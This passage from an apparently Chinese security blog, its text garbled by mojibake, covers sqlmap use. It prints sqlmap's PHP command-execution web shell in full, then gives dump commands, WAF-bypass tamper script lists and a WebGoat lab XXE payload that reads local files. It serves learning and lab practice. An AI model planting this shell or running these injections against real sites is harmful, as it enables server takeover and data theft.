<p><code>tmpbylqf.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">@<span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;max_execution_time&quot;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$z</span>=@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;disable_functions&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$z</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$z</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[, ]+/&quot;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="variable">$z</span>);</span><br><span class="line">        <span class="variable">$z</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$z</span>);</span><br><span class="line">        <span class="variable">$z</span>=<span class="title function_ invoke__">array_map</span>(<span class="string">&quot;trim&quot;</span>,<span class="variable">$z</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$z</span>=<span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$c</span>.<span class="string">&quot; 2&gt;&amp;1\n&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$z</span>;<span class="keyword">return</span> <span class="title function_ invoke__">is_callable</span>(<span class="variable">$n</span>)<span class="keyword">and</span>!<span class="title function_ invoke__">in_array</span>(<span class="variable">$n</span>,<span class="variable">$z</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;system&quot;</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="variable">$w</span>=<span class="title function_ invoke__">ob_get_clean</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;proc_open&quot;</span>))&#123;</span><br><span class="line">    <span class="variable">$y</span>=<span class="title function_ invoke__">proc_open</span>(<span class="variable">$c</span>,<span class="keyword">array</span>(<span class="keyword">array</span>(pipe,r),<span class="keyword">array</span>(pipe,w),<span class="keyword">array</span>(pipe,w)),<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$w</span>=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$t</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">        <span class="variable">$w</span>.=<span class="title function_ invoke__">fread</span>(<span class="variable">$t</span>[<span class="number">1</span>],<span class="number">512</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="title function_ invoke__">proc_close</span>(<span class="variable">$y</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;shell_exec&quot;</span>))&#123;</span><br><span class="line">    <span class="variable">$w</span>=<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;passthru&quot;</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="variable">$w</span>=<span class="title function_ invoke__">ob_get_clean</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;popen&quot;</span>))&#123;</span><br><span class="line">    <span class="variable">$x</span>=<span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>,r);</span><br><span class="line">    <span class="variable">$w</span>=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_resource</span>(<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$x</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$w</span>.=<span class="title function_ invoke__">fread</span>(<span class="variable">$x</span>,<span class="number">512</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="title function_ invoke__">pclose</span>(<span class="variable">$x</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;exec&quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$w</span>=<span class="keyword">array</span>();</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>,<span class="variable">$w</span>);</span><br><span class="line">        <span class="variable">$w</span>=<span class="title function_ invoke__">join</span>(<span class="title function_ invoke__">chr</span>(<span class="number">10</span>),<span class="variable">$w</span>).<span class="title function_ invoke__">chr</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$w</span>=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;&lt;pre&gt;<span class="subst">$w</span>&lt;/pre&gt;&quot;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯ä¸€ä¸ªç”¨äºå‘½ä»¤æ‰§è¡Œçš„ä»£ç ï¼Œå‘½ä»¤æ‰§è¡Œåä¼šå°†æ‰§è¡Œçš„ç»“æœè¾“å‡ºã€‚</p>
<p>ç›´æ¥åœ¨ç½‘ç«™è®¿é—®è¿™ä¸¤ä¸ª<code>shell</code>æ–‡ä»¶å°±å¯ä»¥çœ‹åˆ°äº†</p>
<p>ä¸€ä¸ªæä¾›äº†ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„å…¥å£ï¼Œä¸€ä¸ªæä¾›äº†ä¸€ä¸ªä»¥<code>cmd</code>å‚æ•°çš„å‘½ä»¤æ‰§è¡Œçª—å£</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">æˆåŠŸåä¼šåœ¨ç½‘ç«™ç»å¯¹è·¯å¾„ä¸‹ï¼Œç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªå¯ä»¥ä¸Šä¼ ï¼Œä¸€ä¸ªå¯ä»¥æ‰§è¡Œå‘½ä»¤ã€‚</span><br><span class="line"></span><br><span class="line">tmpugvzq.phpæ˜¯å¯ä»¥ä¸Šä¼ </span><br><span class="line">tmpbylqf.phpæ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤</span><br></pre></td></tr></table></figure>

<p>ã€å¦‚æœæ²¡çœ‹åˆ°ï¼Œå¯ä»¥æŸ¥çœ‹<code>wireshark</code>æˆ–è€…å…ˆ<code>bp</code>æŠ“åŒ…æ•°æ®æµå¹¶æ—¶åˆ»å¼€å¯ç›‘å¬ã€‘</p>
<p><strong>è¿™ä¸ªæ—¶å€™sqlmapä¸»è¦åšäº†ä¸‰ä»¶äº‹æƒ…ï¼š</strong></p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>ã€è¿›è¡Œç›®æ ‡çš„ä¸€ä¸ªåŸºç¡€ä¿¡æ¯çš„æ¢æµ‹ã€‚</span><br><span class="line"><span class="number">2</span>ã€ä¸Šä¼ <span class="keyword">shell</span>åˆ°ç›®æ ‡webç½‘ç«™ä¸Šã€‚</span><br><span class="line"><span class="number">3</span>ã€é€€å‡ºæ—¶åˆ é™¤<span class="keyword">shell</span>ã€‚</span><br></pre></td></tr></table></figure>



<h4 id="2-Database"><a href="#2-Database" class="headerlink" title="2.Database"></a>2.Database</h4><p>æ•°æ®åº“æ”¯æŒå¤–è¿ï¼Œé€šè¿‡<code>Sqlmap</code>æ‰§è¡Œ<code>--os-shell</code>è·å–<code>shell</code>ã€‚</p>
<p>å¿…è¦æ¡ä»¶ï¼š</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">æ•°æ®åº“æ”¯æŒå¤–è¿</span><br><span class="line"></span><br><span class="line">æ•°æ®åº“æƒé™ä¸º<span class="keyword">SA</span>æƒé™</span><br></pre></td></tr></table></figure>

<p><code>Mysql</code>å’Œ<code>sqlsever</code>ä¸¤è€…çš„æƒ…å†µä¸åŒï¼Œè¯¦ç»†å»ºè®®çœ‹æ–‡ç« å­¦ä¹ </p>
<h3 id="Windows-æ³¨å†Œè¡¨è®¿é—®"><a href="#Windows-æ³¨å†Œè¡¨è®¿é—®" class="headerlink" title="Windows æ³¨å†Œè¡¨è®¿é—®"></a>Windows æ³¨å†Œè¡¨è®¿é—®</h3><p>è¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥è®¿é—®åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»ŸWindows æ³¨å†Œè¡¨ã€‚</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">â€“reg-read è¯»ä¸€ä¸ªWindows æ³¨å†Œè¡¨é¡¹å€¼</span><br><span class="line">â€“reg-<span class="built_in">add</span> å†™ä¸€ä¸ªWindows æ³¨å†Œè¡¨é¡¹å€¼æ•°æ®</span><br><span class="line">â€“reg-del åˆ é™¤Windows æ³¨å†Œè¡¨é”®å€¼</span><br><span class="line">â€“<span class="attribute">reg-key</span>=REGKEY Windows æ³¨å†Œè¡¨é”®</span><br><span class="line">â€“<span class="attribute">reg-value</span>=REGVAL Windows æ³¨å†Œè¡¨é¡¹å€¼</span><br><span class="line">â€“<span class="attribute">reg-data</span>=REGDATA Windows æ³¨å†Œè¡¨é”®å€¼æ•°æ®</span><br><span class="line">â€“<span class="attribute">reg-type</span>=REGTYPE Windows æ³¨å†Œè¡¨é¡¹å€¼ç±»å‹</span><br></pre></td></tr></table></figure>

<h3 id="Generalï¼ˆä¸€èˆ¬ï¼‰"><a href="#Generalï¼ˆä¸€èˆ¬ï¼‰" class="headerlink" title="Generalï¼ˆä¸€èˆ¬ï¼‰"></a>Generalï¼ˆä¸€èˆ¬ï¼‰</h3><p>è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥è®¾ç½®ä¸€äº›ä¸€èˆ¬çš„å·¥ä½œå‚æ•°ã€‚</p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line">-t TRAFFICFILE è®°å½•æ‰€æœ‰ HTTP æµé‡åˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­</span><br><span class="line">-s SESSIONFILE ä¿å­˜å’Œæ¢å¤æ£€ç´¢ä¼šè¯æ–‡ä»¶çš„æ‰€æœ‰æ•°æ®</span><br><span class="line">â€“<span class="keyword">flush</span>-session åˆ·æ–°å½“å‰ç›®æ ‡çš„ä¼šè¯æ–‡ä»¶</span><br><span class="line">â€“fresh-queries å¿½ç•¥åœ¨ä¼šè¯æ–‡ä»¶ä¸­å­˜å‚¨çš„æŸ¥è¯¢ç»“æœ</span><br><span class="line">â€“eta æ˜¾ç¤ºæ¯ä¸ªè¾“å‡ºçš„é¢„è®¡åˆ°è¾¾æ—¶é—´</span><br><span class="line">â€“update æ›´æ–° SqlMap</span><br><span class="line">â€“<span class="keyword">save</span> <span class="keyword">file</span> ä¿å­˜é€‰é¡¹åˆ° INI é…ç½®æ–‡ä»¶</span><br><span class="line">â€“batch ä»ä¸è¯¢é—®ç”¨æˆ·è¾“å…¥ï¼Œä½¿ç”¨æ‰€æœ‰é»˜è®¤é…ç½®ã€‚</span><br></pre></td></tr></table></figure>

<h3 id="Miscellaneousï¼ˆæ‚é¡¹"><a href="#Miscellaneousï¼ˆæ‚é¡¹" class="headerlink" title="Miscellaneousï¼ˆæ‚é¡¹"></a>Miscellaneousï¼ˆæ‚é¡¹</h3><figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">â€“beep å‘ç° SQL æ³¨å…¥æ—¶æé†’</span><br><span class="line">â€“check-payload IDS å¯¹æ³¨å…¥ payloads çš„æ£€æµ‹æµ‹è¯•</span><br><span class="line">â€“cleanup sqlmap.py å…·ä½“çš„ UDF å’Œè¡¨æ¸…ç† DBMS</span><br><span class="line">â€“forms å¯¹ç›®æ ‡ URL çš„è§£æå’Œæµ‹è¯•å½¢å¼</span><br><span class="line">â€“gpage=GOOGLEPAGE ä»æŒ‡å®šçš„é¡µç ä½¿ç”¨è°·æ­Œ dork ç»“æœ</span><br><span class="line">â€“page-<span class="built_in">rank</span> Google dork ç»“æœæ˜¾ç¤ºç½‘é¡µæ’åï¼ˆPRï¼‰</span><br><span class="line">â€“<span class="built_in">parse</span>-errors ä»å“åº”é¡µé¢è§£ææ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„é”™è¯¯æ¶ˆæ¯</span><br><span class="line">â€“replicate å¤åˆ¶è½¬å‚¨çš„æ•°æ®åˆ°ä¸€ä¸ª sqlite3 æ•°æ®åº“</span><br><span class="line">â€“tor ä½¿ç”¨é»˜è®¤çš„ Torï¼ˆVidalia/ Privoxy/ Polipoï¼‰ä»£ç†åœ°å€</span><br><span class="line">â€“wizard ç»™åˆçº§ç”¨æˆ·çš„ç®€å•å‘å¯¼ç•Œé¢</span><br></pre></td></tr></table></figure>

<h3 id="åˆ¶å®šæµ‹è¯•çš„ç§ç±»"><a href="#åˆ¶å®šæµ‹è¯•çš„ç§ç±»" class="headerlink" title="åˆ¶å®šæµ‹è¯•çš„ç§ç±»"></a>åˆ¶å®šæµ‹è¯•çš„ç§ç±»</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">â€“<span class="attribute">technique</span>=TECH SQLæ³¨å…¥æŠ€æœ¯æµ‹è¯•ï¼ˆé»˜è®¤ BEUSTï¼‰</span><br><span class="line">Techniquesï¼ˆæŠ€å·§ï¼‰ï¼š</span><br><span class="line">â€“technique æµ‹è¯•æŒ‡å®šæ³¨å…¥ç±»å‹ä½¿ç”¨çš„æŠ€æœ¯</span><br></pre></td></tr></table></figure>


<p>ä¸åŠ å‚æ•°é»˜è®¤æµ‹è¯•æ‰€æœ‰æ³¨å…¥æŠ€æœ¯:</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">B:</span> åŸºäºå¸ƒå°”çš„ SQL ç›²æ³¨</span><br><span class="line"><span class="symbol">E:</span> åŸºäºæ˜¾é”™ sql æ³¨å…¥</span><br><span class="line"><span class="symbol">U:</span> åŸºäº UNION æ³¨å…¥</span><br><span class="line"><span class="symbol">S:</span> å å±‚ sql æ³¨å…¥</span><br><span class="line"><span class="symbol">T:</span> åŸºäºæ—¶é—´ç›²æ³¨</span><br></pre></td></tr></table></figure>

<h3 id="sqlmap-åˆ¤æ–­waf"><a href="#sqlmap-åˆ¤æ–­waf" class="headerlink" title="sqlmap åˆ¤æ–­waf"></a>sqlmap åˆ¤æ–­waf</h3><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://www.test.com/&quot;</span> <span class="params">--identify-waf</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>

<h2 id="ä¸€èˆ¬æ³¨å…¥æµç¨‹"><a href="#ä¸€èˆ¬æ³¨å…¥æµç¨‹" class="headerlink" title="ä¸€èˆ¬æ³¨å…¥æµç¨‹"></a>ä¸€èˆ¬æ³¨å…¥æµç¨‹</h2><p>ä»¥mysqlä¸ºä¾‹</p>
<p>1.éªŒè¯æ³¨å…¥</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">sqlmap -u â€œæ³¨å…¥ç‚¹<span class="built_in">URL</span>â€</span><br></pre></td></tr></table></figure>

<p>ä»ä¸­å¯ä»¥å‘ç°å­˜åœ¨æ³¨å…¥çš„ç±»å‹ï¼Œæ•°æ®åº“ç±»å‹å’Œwebåº”ç”¨ç¨‹åºPHPå’ŒApacheç­‰ç‰ˆæœ¬ä¿¡æ¯ã€‚</p>
<p>2.åˆ—ä¸¾æ•°æ®åº“å</p>
<figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"><span class="string">sqlmap</span> -<span class="string">u</span> <span class="string">&quot;æ³¨å…¥ç‚¹&quot;</span> <span class="built_in">--dbs</span></span><br><span class="line"><span class="string">sqlmap</span> -<span class="string">u</span> <span class="string">&quot;æ³¨å…¥ç‚¹&quot;</span> <span class="built_in">--current-db</span>  <span class="comment">#åˆ—ä¸¾å½“å‰ä½¿ç”¨çš„æ•°æ®åº“</span></span><br></pre></td></tr></table></figure>

<p>3.æŸ¥è¯¢æŸä¸€æ•°æ®åº“çš„æ‰€æœ‰è¡¨å</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;æ³¨å…¥ç‚¹&quot;</span> -D æ•°æ®åº“å <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>

<p>4.åˆ—ä¸¾è¿™ä¸€æ•°æ®åº“çš„è¡¨çš„æ‰€æœ‰åˆ—ï¼ˆå­—æ®µï¼‰</p>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;æ³¨å…¥ç‚¹&quot;</span> -D æ•°æ®åº“å -<span class="built_in">T</span> è¡¨å --<span class="built_in">columns</span></span><br></pre></td></tr></table></figure>

<p>5.æš´å­—æ®µå†…å®¹</p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="variable">sqlmap</span> <span class="operator">-</span><span class="variable">u</span> <span class="string">&quot;æ³¨å…¥ç‚¹&quot;</span> <span class="operator">-</span><span class="built_in">D</span> æ•°æ®åº“å <span class="operator">-</span><span class="variable">T</span> è¡¨å <span class="operator">-</span><span class="built_in">C</span> <span class="string">&quot;è¦çˆ†çš„å­—æ®µå&quot;</span> <span class="operator">--</span><span class="variable">dump</span></span><br></pre></td></tr></table></figure>

<p>çˆ†ä¸€ä¸ªå­—æ®µçš„è¯å¯èƒ½ä¼šå¾ˆæ…¢æˆ–è€…å‡ºé”™ï¼Œå…¨éƒ¨æš´å‡ºæœ€å¥½ã€‚</p>
<p>å¯ä»¥åœ¨åé¢åŠ ä¸ª â€“batch å¯ä»¥ä¸ç”¨æ‰‹åŠ¨é€‰æ‹©yesæˆ–noçš„é€‰é¡¹ã€‚</p>
<h3 id="sqlmap-tamper-çš„ä½¿ç”¨"><a href="#sqlmap-tamper-çš„ä½¿ç”¨" class="headerlink" title="sqlmap tamper çš„ä½¿ç”¨"></a>sqlmap tamper çš„ä½¿ç”¨</h3><p>å¯ä»¥è¿›è¡Œå„ç§ç»•è¿‡é˜²ç«å¢™å’Œwaf</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="attr">--tamper</span> xxx<span class="selector-class">.py</span>  (.pyå¯ä»¥ä¸åŠ )</span><br></pre></td></tr></table></figure>

<p><code>eg:python sqlmap.py -u â€œâ€ â€“ tamper base64encode.py</code><br>1.æ™®é€šçš„<code>tamper</code>æ­é…æ–¹å¼:</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,</span><br><span class="line"><span class="built_in">charencode,</span>charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,</span><br><span class="line"><span class="built_in">nonrecursivereplacement,</span>percentage,randomcase,securesphere,space2comment,space2plus,</span><br><span class="line"><span class="built_in">space2randomblank,</span>unionalltounion,unmagicquotes</span><br></pre></td></tr></table></figure>

<p>2.æ•°æ®åº“ä¸º<code>MSSQL</code>çš„æ­é…æ–¹å¼ï¼š</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,</span><br><span class="line"><span class="built_in">nonrecursivereplacement,</span>percentage,randomcase,securesphere,sp_password,space2comment,</span><br><span class="line"><span class="built_in">space2dash,</span>space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,</span><br><span class="line">unmagicquotes</span><br></pre></td></tr></table></figure>

<p>3.æ•°æ®åº“ä¸º<code>Mysql</code>çš„æ­é…æ–¹å¼:</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,</span><br><span class="line"><span class="built_in">greatest,</span>halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,</span><br><span class="line"><span class="built_in">multiplespaces,</span>nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,</span><br><span class="line"><span class="built_in">space2morehash,</span>space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,</span><br><span class="line"><span class="built_in">versionedkeywords,</span>versionedmorekeywords,xforwardedfor</span><br></pre></td></tr></table></figure>

<p>4.å¸¸ç”¨è„šæœ¬ç”¨æ³•ï¼š</p>
<blockquote>
<p><code>apostrophemask.py UTF-8ç¼–ç </code><br><code>apostrophenullencode.py unicodeç¼–ç </code><br><code>appendnullbyte.py æ·»åŠ %00</code><br><code>base64encode.py base64ç¼–ç </code><br><code>between.py ä»¥â€not betweenâ€æ›¿æ¢â€&gt;â€œ</code><br><code>bluecoat.py ä»¥éšæœºçš„ç©ºç™½å­—ç¬¦æ›¿ä»£ç©ºæ ¼ï¼Œä»¥â€likeâ€æ›¿ä»£â€=â€œ</code><br><code>chardoubleencode.py åŒé‡urlç¼–ç </code><br><code>charencode.py urlç¼–ç </code><br><code>charunicodeencode.py å¯¹æœªè¿›è¡Œurlç¼–ç çš„å­—ç¬¦è¿›è¡Œunicodeç¼–ç </code><br><code>equaltolike.py ä»¥â€likeâ€æ›¿ä»£â€=â€œ</code><br><code>halfversionedmorekeywords.pyåœ¨æ¯ä¸ªå…³é”®å­—å‰æ·»åŠ æ¡ä»¶æ³¨é‡Š</code><br><code>ifnull2ifisnull.py ä»¥â€IF(ISNULL(A), B, A)â€æ›¿æ¢â€IFNULL(A, B)â€</code><br><code>modsecurityversioned.py æ¡ä»¶æ³¨é‡Š</code><br><code>modsecurityzeroversioned.py æ¡ä»¶æ³¨é‡Šï¼Œ0000</code><br><code>multiplespaces.py æ·»åŠ å¤šä¸ªç©ºæ ¼</code><br><code>nonrecursivereplacement.py å¯ä»¥ç»•è¿‡å¯¹å…³é”®å­—åˆ é™¤çš„é˜²æ³¨å…¥ï¼ˆè¿™ä¸ªæˆ‘ä¹Ÿä¸çŸ¥é“æ€ä¹ˆè¯´å¥½ï¼Œçœ‹ä¾‹å­ã€‚ã€‚ã€‚ï¼‰</code><br><code>percentage.py åœ¨æ¯ä¸ªå­—ç¬¦å‰æ·»åŠ ç™¾åˆ†å·ï¼ˆ%ï¼‰</code><br><code>randomcase.py éšå³å¤§å°å†™</code><br><code>randomcomments.py éšæœºæ’å…¥åŒºå—æ³¨é‡Š</code><br><code>sp_password.py è¯­å¥ç»“å°¾æ·»åŠ â€sp_passwordâ€è¿·æƒ‘æ•°æ®åº“æ—¥å¿—ï¼ˆå¾ˆã€‚ã€‚ã€‚ï¼‰</code><br><code>space2comment.py ä»¥åŒºå—æ³¨é‡Šæ›¿æ¢ç©ºæ ¼</code><br><code>space2dash.py ä»¥å•è¡Œæ³¨é‡Šâ€â€“â€å’Œéšæœºçš„æ–°è¡Œæ›¿æ¢ç©ºæ ¼</code><br><code>space2hash.py ä»¥å•è¡Œæ³¨é‡Šâ€#â€å’Œç”±éšæœºå­—ç¬¦ç»„æˆçš„æ–°è¡Œæ›¿æ¢ç©ºæ ¼</code><br><code>space2morehash.py æ²¡çœ‹å‡ºæ¥å’Œä¸Šé¢é‚£ä¸ªæœ‰ä»€ä¹ˆåŒºåˆ«ã€‚ã€‚</code><br><code>space2mssqlblank.py ä»¥éšæœºç©ºç™½å­—ç¬¦æ›¿æ¢ç©ºæ ¼</code><br><code>space2mssqlhash.py ä»¥å•è¡Œæ³¨é‡Šâ€#â€å’Œæ–°è¡Œæ›¿æ¢ç©ºæ ¼</code><br><code>space2mysqlblank.py ä»¥éšæœºç©ºç™½å­—ç¬¦æ›¿æ¢ç©ºæ ¼</code><br><code>space2mysqldash.py ä»¥å•è¡Œæ³¨é‡Šå’Œæ–°è¡Œæ›¿æ¢ç©ºæ ¼</code><br><code>space2plus.py ä»¥â€+â€æ›¿æ¢ç©ºæ ¼</code><br><code>space2randomblank.py éšæœºç©ºç™½å­—ç¬¦æ›¿æ¢ç©ºæ ¼</code><br><code>unionalltounion.py ä»¥â€union allâ€æ›¿æ¢â€unionâ€</code><br><code>unmagicquotes.py ä»¥â€%bf%27â€æ›¿æ¢å•å¼•å·ï¼Œå¹¶åœ¨ç»“å°¾æ·»åŠ æ³¨é‡Šâ€â€“â€</code><br><code>versionedkeywords.py å¯¹ä¸æ˜¯å‡½æ•°çš„å…³é”®å­—æ¡ä»¶æ³¨é‡Š</code><br><code>versionedmorekeywords.py å¯¹å…³é”®å­—æ¡ä»¶æ³¨é‡Š</code></p>
</blockquote>
]]></content>
      <categories>
        <category>daily</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>çº¿ä¸‹é¶åœºå­¦ä¹ </title>
    <url>//post/underline-learning/</url>
    <content><![CDATA[<p><code>ä¸ºä»€ä¹ˆå­¦ä¹ çº¿ä¸‹é¶åœºï¼Œå› ä¸ºçº¿ä¸‹é¶åœºç›¸æ¯”æ›´åŠ å®¹æ˜“ç†è§£æ¼æ´å…¥é—¨ï¼Œ</code></p>
<p><code>è€Œä¸”å¯ä»¥çœ‹åˆ°ç½‘ç«™çš„æºç ï¼Œä»è€Œå¯ä»¥é”»ç‚¼ä»£ç å®¡è®¡èƒ½åŠ›ï¼Œæ‰¾å‡ºæ¼æ´çš„æˆå› ï¼Œ</code></p>
<p><code>å°è¯•è‡ªå·±æå‡ºç»•è¿‡æˆ–è€…é˜²å¾¡çš„æªæ–½ï¼Œè¿™é‡Œåªè®°å½•ä¸€ä¸‹æœ¬äººè§‰å¾—çš„çº¿ä¸‹é¶åœºå°è±¡æ·±åˆ»ï¼Œå¯¹æœ¬äººæœ‰æ„ä¹‰çš„éƒ¨åˆ†</code></p>
<span id="more"></span>

<h1 id="WebGoat"><a href="#WebGoat" class="headerlink" title="WebGoat"></a>WebGoat</h1><h2 id="ä¸€-XXE"><a href="#ä¸€-XXE" class="headerlink" title="ä¸€.XXE"></a>ä¸€.XXE</h2><h3 id="1-Letâ€™s-try"><a href="#1-Letâ€™s-try" class="headerlink" title="1.Letâ€™s try"></a>1.Letâ€™s try</h3><h4 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">åœ¨æ­¤ä½œä¸šä¸­ï¼Œæ‚¨å°†ä¸ºç…§ç‰‡æ·»åŠ è¯„è®ºï¼Œåœ¨æäº¤è¡¨å•æ—¶å°è¯•ä½¿ç”¨è¯„è®ºå­—æ®µæ‰§è¡Œ XXE æ³¨å…¥ã€‚å°è¯•åˆ—å‡ºæ–‡ä»¶ç³»ç»Ÿçš„æ ¹ç›®å½•ã€‚</span><br></pre></td></tr></table></figure>





<p>æˆ‘ä»¬å…ˆæäº¤è¯„è®ºç„¶åæŠ“åŒ…è¯•è¯•</p>
<p><img src="/post/underline-learning/image-20221015192748515.png" alt="image-20221015192748515"></p>
<p>è¿™æ—¶æˆ‘ä»¬å‘ç°è¯„è®ºçš„å†…å®¹æ˜¯åœ¨ç”¨<code>xml</code>è¿›è¡Œä¼ é€’ï¼Œ</p>
<p>å¯ä»¥ç¼–å†™<code>dtd</code>æ¥è¿›è¡Œå†…éƒ¨å®ä½“æ³¨å…¥</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">comment</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">root</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/&quot;</span>&gt;</span>     </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">text</span>&gt;</span></span><br><span class="line">      <span class="symbol">&amp;root;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/underline-learning/image-20221015195142684.png" alt="image-20221015195142684"></p>
<p>æˆåŠŸ</p>
